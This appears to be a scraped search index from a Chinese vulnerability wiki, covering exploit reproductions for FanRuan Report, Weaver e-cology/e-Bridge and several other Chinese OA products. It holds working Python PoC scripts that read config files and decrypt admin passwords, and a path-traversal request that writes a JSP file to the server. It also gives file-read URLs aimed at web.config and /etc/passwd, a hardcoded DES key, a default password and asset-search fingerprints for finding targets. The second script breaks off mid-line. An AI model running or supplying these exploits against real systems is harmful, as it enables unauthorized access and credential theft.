StringBuilder(); var1.append(\"___\"); if (var0 == null) { return var1.toString(); } else { int var2 = 0; for(int var3 = 0; var3 \u003c var0.length(); ++var3) { if (var2 == PASSWORD_MASK_ARRAY.length) { var2 = 0; } int var4 = var0.charAt(var3) ^ PASSWORD_MASK_ARRAY[var2]; String var5 = Integer.toHexString(var4); int var6 = var5.length(); for(int var7 = 0; var7 \u003c 4 - var6; ++var7) { var5 = \"0\" + var5; } var1.append(var5); ++var2; } return var1.toString(); } } 解密函数 public static String passwordDecode(String var0) { if (var0 != null \u0026\u0026 var0.startsWith(\"___\")) { var0 = var0.substring(3); StringBuilder var1 = new StringBuilder(); int var2 = 0; for(int var3 = 0; var3 \u003c= var0.length() - 4; var3 += 4) { if (var2 == PASSWORD_MASK_ARRAY.length) { var2 = 0; } String var4 = var0.substring(var3, var3 + 4); int var5 = Integer.parseInt(var4, 16) ^ PASSWORD_MASK_ARRAY[var2]; var1.append((char)var5); ++var2; } var0 = var1.toString(); } return var0; } 使用python写出的解密代码为 cipher = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' #密文 PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] #掩码 Password = \"\" cipher = cipher[3:] #截断三位后 for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) print (Password) 这里使用上面讲述的原理进行复现,访问目标 路径分为两种 /WebReport/ReportServer ReportServer 访问POC为,读取密码文件 privilege.xml /WebReport/ReportServer?op=chart\u0026cmd=get_geo_json\u0026resourcepath=privilege.xml 使用解密脚本解密文件 得到密码，即可登陆后台系统，账户为 admin ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/:4:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/"},{"categories":null,"content":"漏洞POC import requests import sys import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 帆软报表 v8.0 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def decode_passwd(cipher): PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23] # 掩码 Password = \"\" cipher = cipher[3:] # 截断三位后 for i in range(int(len(cipher) / 4)): c1 = int(\"0x\" + cipher[i * 4:(i + 1) * 4], 16) c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8] Password = Password + chr(c2) return Password def POC_1(target_url): vuln_url_1 = target_url + '/WebReport/ReportServer' vuln_url_2 = target_url + '/ReportServer' headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response_1 = requests.get(url=vuln_url_1, timeout=5, verify=False, headers=headers) response_2 = requests.get(url=vuln_url_2, timeout=5, verify=False, headers=headers) if \"部署页面\" in response_1.text: print(\"\\033[32m[o] 目标部署页面为: {} \\033[0m\".format(vuln_url_1)) POC_2(vuln_url_1) elif \"部署页面\" in response_2.text: print(\"\\033[32m[o] 目标部署页面为: {} \\033[0m\".format(vuln_url_2)) POC_2(vuln_url_2) else: print(\"\\033[31m[x] 目标漏洞无法利用 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 目标漏洞无法利用 {} \\033[0m\".format(e)) sys.exit(0) def POC_2(vuln_url_fileread): vuln_url = vuln_url_fileread + \"?op=chart\u0026cmd=get_geo_json\u0026resourcepath=privilege.xml\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, verify=False, timeout=5) print(\"\\033[32m[o] 正在访问: {} \\033[0m\".format(vuln_url)) if \"rootManagerPassword\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标存在漏洞,读取敏感文件 \\n{} \\033[0m\".format(response.text)) user_name = re.findall(r'\u003c!\\[CDATA\\[(.*?)]]\u003e\u003c/rootManagerName\u003e', response.text) cipher = re.findall(r'\u003c!\\[CDATA\\[(.*?)]]\u003e\u003c/rootManagerPassword\u003e', response.text) password = decode_passwd(cipher[0]) print(\"\\033[34m[o] 后台账户密码为:{} {} \\033[0m\".format(user_name[0], password)) else: print(\"\\033[31m[x] 目标 {}不存在漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 目标 {} 请求失败 \\033[0m\".format(target_url)) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/:5:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v8-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cnvd-2018-04757/"},{"categories":null,"content":"帆软报表 V9 任意文件覆盖文件上传 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞描述 帆软 V9 存在任意文件覆盖，导致攻击者可以任意文件上传 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:1:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞影响 帆软 V9 ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:2:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"漏洞复现 POST /WebReport/ReportServer?op=svginit\u0026cmd=design_save_svg\u0026filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1 Host: 192.168.10.1 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: JSESSIONID=DE7874FC92F0852C84D38935247D947F; JSESSIONID=A240C26B17628D871BB74B7601482FDE Connection: close Content-Type:text/xml;charset=UTF-8 Content-Length: 74 {\"__CONTENT__\":\"\u003c%out.println(\\\"Hello World!\\\");%\u003e\",\"__CHARSET__\":\"UTF-8\"} ","date":"0001-01-01","objectID":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:3:0","tags":null,"title":"","uri":"/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8-v9-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":null,"content":"新点OA ExcelExport 敏感信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 新点OA 存在敏感信息泄露漏洞，访问特定的Url时可以获取所有用户的登录名信息，攻击者获取后可以进一步利用 ","date":"0001-01-01","objectID":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 新点OA ","date":"0001-01-01","objectID":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"新点OA\" ","date":"0001-01-01","objectID":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 构造的Url为 /ExcelExport/人员列表.xls 将会下载人员列表文件 通过获取的登录名登陆后台(默认密码11111) ","date":"0001-01-01","objectID":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%96%B0%E7%82%B9oa-excelexport-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"智明 SmartOA EmailDownload.ashx 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 智明 SmartOA EmailDownload.ashx文件存在任意文件下载漏洞，通过漏洞可下载服务器上的敏感文件，查看敏感信息 ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 智明 SmartOA ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"智明协同-SmartOA\" ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /file/EmailDownload.ashx?url=~/web.config\u0026name=web.config ","date":"0001-01-01","objectID":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%99%BA%E6%98%8E-smartoa-emaildownload.ashx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"极限OA video_file.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 极限OA video_file.php存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感文件 ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 极限OA ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1967132225\" ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/\u0026MEDIA_NAME=oa_config.php ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%99%90oa-video_file.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA DBconfigReader.jsp 数据库配置信息泄漏漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 2019年10月24日，360CERT监测到友商发布了泛微e-cology OA数据库配置信息泄漏漏洞预警，漏洞等级中。 攻击者可通过存在漏洞的页面直接获取到数据库配置信息。如果攻击者可直接访问数据库，则可直接获取用户数据，甚至可以直接控制数据库服务器。 360CERT判断漏洞等级为中，危害面/影响面低。建议使用泛微e-cology OA的用户及时安装最新补丁，以免遭受黑客攻击。 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 目前已知为8.100.0531,不排除其他版本，包括不限于EC7.0、EC8.0、EC9.0版 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 根据源码可以得到DES密钥为 1z2x3c4v5b6n（也有1z2x3c4v的,可以按此规律来爆破） 可以看到会将当前连接数据库的用户名密码，url，logintype等信息进行des加密，并最终进行返回，可以直接通过des解密获取泄露信息。 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC Github链接 python代码 import base64 import requests import ast def req(url): headers = { 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', } r1 = requests.get(url,headers=headers).content s = r1.replace('\\r\\n','') res1 = base64.b64encode(s) postdata = { 'data':res1, 'type':'des', 'arg':'m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1' } u = 'http://tool.chacuo.net/cryptdes' r2 = requests.post(u,data=postdata,headers=headers).content res2 = ast.literal_eval(r2) return res2['data'] url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp' print req(url) ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 [更新]泛微e-cology OA数据库配置信息泄漏漏洞预警 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-dbconfigreader.jsp-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"泛微OA E-Bridge saveYZJFile 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 泛微云桥（e-Bridge）是上海泛微公司在”互联网+”的背景下研发的一款用于桥接互联网开放资源与企业信息化系统的系统集成中间件。泛微云桥存在任意文件读取漏洞，攻击者成功利用该漏洞，可实现任意文件读取，获取敏感信息。 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 泛微云桥 e-Bridge 2018-2019 多个版本 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"泛微云桥e-Bridge\" ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 分为两种，分别为 Windows 和 Linux ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Windows 访问 http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test\u0026downloadUrl=file:///C:/\u0026fileExt=txt 成功返回 id值,说明含有此漏洞 调用查看文件接口访问 http://xxx.xxx.xxx.xxx/file/fileNoLogin/id 值 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:1","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Linux 访问 http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test\u0026downloadUrl=file:///etc/passwd\u0026fileExt=txt 成功返回 id值,说明含有此漏洞 调用查看文件接口访问 http://xxx.xxx.xxx.xxx/file/fileNoLogin/id 值 ","date":"0001-01-01","objectID":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:2","tags":null,"title":"","uri":"/%E6%B3%9B%E5%BE%AEoa-e-bridge-saveyzjfile-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC 注意读取Linux系统文件时，需要完整路径 例如读取根目录下的 1.txt 应为 /1.txt 而不是 1.txt #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 泛微云桥 e-Bridge \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') # 判断操作系统 or 判断漏洞是否可利用 def POC_1(target_url): vuln_url_1 = target_url + \"/wxjsapi/saveYZJFile?fileName=test\u0026downloadUrl=file:///C:/\u0026fileExt=txt\" vuln_url_2 = target_url + \"/wxjsapi/saveYZJFile?fileName=test\u0026downloadUrl=file:///etc/passwd\u0026fileExt=txt\" vuln_url_3 = target_url + \"/wxjsapi/saveYZJFile?fileName=test\u0026downloadUrl=file:///\u0026fileExt=txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=10) response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=10) response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=10) if \"无法验证您的身份\" in response_1.text and \"无法验证您的身份\" in response_2.text: print(\"\\033[31m[x] 漏洞已修复，不存在漏洞 \\033[0m\") sys.exit(0) else: if \"No such file or directory\" in response_1.text: print(\"\\033[32m[o] 目标为 Linux 系统\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_3.text)[0] print(\"\\033[32m[o] 成功获取id：{}\\033[0m\".format(id)) return id,\"linux\" elif \"系统找不到指定的路径\" in response_2.text: print(\"\\033[32m[o] 